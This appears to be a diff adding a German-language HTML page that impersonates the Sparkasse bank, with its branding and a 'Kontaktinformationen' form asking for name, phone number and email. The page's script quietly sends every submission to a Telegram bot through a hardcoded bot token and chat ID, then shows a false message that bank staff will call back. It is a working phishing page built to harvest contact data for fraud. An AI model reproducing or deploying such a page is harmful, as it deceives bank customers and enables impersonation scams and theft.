@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" type="image/x-icon" sizes="32x32" href="tenant_header_logo 2.svg">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sparkasse</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            background-color: #e2001a;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        header img {
+            height: 40px;
+            margin-left: 30px;
+            margin-top: 10px;
+            margin-bottom: 10px;
+        }
+
+        nav {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+
+        nav a {
+            color: #fff;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        nav a:hover {
+            text-decoration: underline;
+        }
+
+        .online-banking {
+            background-color: #fff;
+            color: #e2001a;
+            padding: 8px 12px;
+            border-radius: 5px;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .online-banking:hover {
+            background-color: #f0f0f0;
+        }
+
+        .container {
+            padding-right: 10px;
+        }
+
+        .form-container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 50px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+        }
+
+        .form-container h2 {
+            text-align: center;
+            margin-bottom: 45px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 20px;
+            margin-bottom: 5px;
+            border: 1px solid #555;
+            border-radius: 10px;
+            font-size: 17px;
+            background-color: #222;
+            color: #fff;
+            box-sizing: border-box;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #e2001a;
+        }
+
+        .submit-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #e2001a;
+            margin-top: 23px;
+            border: none;
+            border-radius: 20px;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .submit-button:hover {
+            background-color: #b00016;
+        }
+
+        footer {
+            padding: 15px;
+            text-align: center;
+            color: #aaa;
+            font-size: 12px;
+        }
+
+        @media (max-width: 480px) {
+            header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 10px;
+            }
+
+            nav {
+                flex-wrap: wrap;
+                gap: 10px;
+            }
+
+            .form-container {
+                width: 90%;
+                padding: 15px;
+            }
+
+            .form-group input {
+                font-size: 13px;
+            }
+
+            .submit-button {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <img src="tenant_header_logo.svg" alt="Sparkasse Logo">
+        <nav>
+        </nav>
+    </header>
+
+    <div class="container">
+        <div class="form-container">
+            <h2>Kontaktinformationen</h2>
+            <form id="contactForm">
+                <div class="form-group">
+                    <label for="firstName"></label>
+                    <input type="text" id="firstName" placeholder="Vorname" required>
+                </div>
+                <div class="form-group">
+                    <label for="lastName"></label>
+                    <input type="text" id="lastName" placeholder="Nachname" required>
+                </div>
+                <div class="form-group">
+                    <label for="phone"></label>
+                    <input type="tel" id="phone" placeholder="Telefonnummer" required>
+                </div>
+                <div class="form-group">
+                    <label for="email"></label>
+                    <input type="email" id="email" placeholder="E-Mail" required>
+                </div>
+                <button type="submit" class="submit-button">Weiter</button>
+            </form>
+        </div>
+    </div>
+
+    <footer>
+        <p>© 2025 Alle Rechte vorbehalten | Sparkasse</p>
+    </footer>
+
+    <script>
+        document.getElementById('contactForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+            const phone = document.getElementById('phone').value;
+            const email = document.getElementById('email').value;
+
+            const botToken = '7999556199:AAEC3tCfjfVncG4LbLhGSFy9I9x5xiMan6M';
+            const chatId = '-4760085807';
+
+            const message = `Neue Anfrage:\nVorname: ${firstName}\nNachname: ${lastName}\nTelefonnummer: ${phone}\nE-Mail-Adresse: ${email}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`, {
+                method: 'GET'
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert("Das Formular wurde erfolgreich ausgefüllt. Unsere Mitarbeiter werden sich in Kürze mit Ihnen in Verbindung setzen.");
+                window.location.href = '/success.html'; 
+            })
+            .catch(error => {
+                alert("Fehler beim Senden des Formulars.");
+            });
+        });
+    </script>
+</body>
+</html>
